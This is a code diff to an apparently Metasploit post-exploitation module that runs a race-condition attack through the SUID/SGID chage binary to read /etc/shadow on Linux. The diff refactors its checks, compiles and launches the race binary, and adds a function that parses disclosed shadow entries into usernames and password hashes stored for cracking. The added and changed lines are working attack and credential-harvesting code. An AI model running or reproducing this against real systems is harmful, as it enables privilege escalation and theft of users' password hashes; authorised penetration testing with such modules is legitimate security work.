@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Linux::System
+  include Msf::Post::Linux::Kernel
   include Msf::Exploit::FileDropper
 
   def initialize(info = {})
@@ -63,7 +64,7 @@ class MetasploitModule < Msf::Post
   end
 
   def check
-    version = cmd_exec('uname -r').to_s.strip
+    version = kernel_release.to_s.strip
 
     if version.nil? || version.empty?
       return Exploit::CheckCode::Unknown(
@@ -85,19 +86,13 @@ class MetasploitModule < Msf::Post
       )
     end
 
-    mode = cmd_exec(
-      'stat -c %a /usr/bin/chage'
-    ).to_s.strip
-
-    unless mode.start_with?('2', '4', '6')
-      return Exploit::CheckCode::Detected(
+    unless setuid?('/usr/bin/chage') || stat('/usr/bin/chage').setgid?
+      return Exploit::CheckCode::Safe(
         'chage does not appear to have SGID/SUID permissions'
       )
     end
 
-    ptrace_scope = cmd_exec(
-      'cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null'
-    ).to_i
+    ptrace_scope = yama_ptrace_scope
 
     if ptrace_scope > 0
       vprint_warning(
@@ -298,9 +293,7 @@ class MetasploitModule < Msf::Post
 
     print_status('Compiling exploit payload')
 
-    compile = cmd_exec(
-      "gcc -O2 #{c_path} -o #{bin_path} 2>&1"
-    )
+    compile = create_process('gcc', args: ['-O2', c_path, '-o', bin_path], time_out: 120)
 
     vprint_status(compile) unless compile.nil? || compile.empty?
 
@@ -317,11 +310,7 @@ class MetasploitModule < Msf::Post
       "Launching race with #{datastore['RACE_ROUNDS']} attempts"
     )
 
-    output = cmd_exec(
-      "#{bin_path} #{datastore['RACE_ROUNDS']}",
-      nil,
-      30
-    )
+    output = create_process(bin_path, args: [datastore['RACE_ROUNDS'].to_s], time_out: 30)
 
     if output.nil? || output.empty?
       fail_with(Failure::Unknown,
@@ -331,6 +320,7 @@ class MetasploitModule < Msf::Post
     if output.include?('$')
 
       print_good('Successfully disclosed /etc/shadow')
+      log_shadow_credentials(output)
 
       loot = store_loot(
         'linux.shadow',
@@ -338,7 +328,7 @@ class MetasploitModule < Msf::Post
         session,
         output,
         'shadow.txt',
-        'Disclosed /etc/shadow'
+        'Linux Password Shadow File'
       )
 
       print_good("Loot stored at: #{loot}")
@@ -354,5 +344,41 @@ class MetasploitModule < Msf::Post
 
       vprint_status(output)
     end
+  end
+
+  # Log disclosed shadow hashes using the same credential handling as modules/post/linux/gather/hashdump.rb
+  def log_shadow_credentials(shadow_text)
+    return if shadow_text.nil? || shadow_text.empty?
+
+    shadow_text.each_line do |line|
+      next if line.strip.empty?
+
+      hash_parts = line.split(':')
+      next unless hash_parts.length >= 2
+
+      username = hash_parts[0]
+      private_data = hash_parts[1]
+      next if private_data.nil? || private_data.empty?
+      next if ['*', '!'].include?(private_data)
+
+      jtr_format = Metasploit::Framework::Hashes.identify_hash(private_data)
+      jtr_format = 'des,bsdi,crypt' if jtr_format.empty?
+
+      credential_data = {
+        jtr_format: jtr_format,
+        origin_type: :session,
+        post_reference_name: refname,
+        private_type: :nonreplayable_hash,
+        private_data: private_data,
+        session_id: session_db_id,
+        username: username,
+        workspace_id: myworkspace_id
+      }
+
+      create_credential(credential_data)
+      vprint_good("Logged shadow credential for #{username}")
+    end
+  rescue StandardError => e
+    vprint_error("Unable to log shadow credentials: #{e}")
   end
 end
